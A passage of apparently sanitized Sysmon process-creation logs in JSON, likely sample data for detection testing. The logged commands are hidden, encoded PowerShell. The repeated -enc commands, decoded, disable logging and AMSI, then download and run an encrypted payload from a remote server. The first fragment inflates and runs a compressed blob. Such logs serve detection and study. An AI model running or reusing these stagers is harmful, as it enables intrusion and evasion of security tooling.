JRxWzxFZt/m8X2XO1jaMy9mJt70K+pczx9+MWpXzQW1hNA2jHjX7lsmuRyY3OpU+CmP2eB2eGsuwbpiWR/C427PMbtcyjd7l/KFxXgnBd4hm5qB/TMbx8HYGfQtScCp6zfbxmn1uD0h/lcUyH0xrPERGe7yxKpXqKDlGC5MZJoBojR8gp1FsdSj43/WOmdGnN8+23Vbj2htXzxLny8eMWaC2xMftaEhesPVeWXYQT2aIAotQbYtDZTFu5cWzw0jmoSi7+3OBeYQpXDxwNRVaNChlXlbB8zIL98e+qk/hXPWgeXL8ZkuVngzV58peDF1cjCFPkPdOduU2jkIx0/T1ia5DidbXNR22+uubq7N4o+xjaVmNzwF6ik938dVM8KWHs7Nq0mRO+/+FLz9rM3j5/w7f89g/zP4SpLpWbP6nidcDvwXwb29/gIgASxfqBcX7q+w9FHK9vLj+nygCRQT5k32HfU3F0Q18GvwNaNpG4fYJAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentProcessGuid": "49F1AF32-DF74-5A7A-0000-001025697301",
      "ParentProcessId": "2464",
      "ProcessGuid": "49F1AF32-DF74-5A7A-0000-001081AE7301",
      "ProcessId": "1472",
      "Product": "Microsoft� Windows� Operating System",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "5076450",
      "Execution": {
        "ProcessID": "1312",
        "ThreadID": "1884"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-20D3-59C2-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-20D7-59C2-0000-001053F40100",
      "ParentProcessId": "1980",
      "ProcessGuid": "49F1AF32-21D2-59C2-0000-00106A171000",
      "ProcessId": "3708",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "1012693",
      "Execution": {
        "ProcessID": "1384",
        "ThreadID": "1952"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-20D3-59C2-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-20D7-59C2-0000-001053F40100",
      "ParentProcessId": "1980",
      "ProcessGuid": "49F1AF32-220E-59C2-0000-00104FB21000",
      "ProcessId": "2960",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "1015643",
      "Execution": {
        "ProcessID": "1384",
        "ThreadID": "1952"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-8951-59C1-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-8955-59C1-0000-00105DF90100",
      "ParentProcessId": "1956",
      "ProcessGuid": "49F1AF32-8A4D-59C1-0000-001042F00A00",
      "ProcessId": "3888",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "868395",
      "Execution": {
        "ProcessID": "1336",
        "ThreadID": "1876"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc JABHAHIAbwBVAFAAUABvAGwAaQBjAHkAUwBlAFQAVABpAE4ARwBTACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEATABVAEUAKAAkAG4AVQBMAGwAKQA7ACQARwByAE8AVQBwAFAAbwBsAGkAYwBZAFMARQBUAFQASQBOAGcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAE8AdQBwAFAAbwBMAGkAQwBZAFMAZQB0AHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkA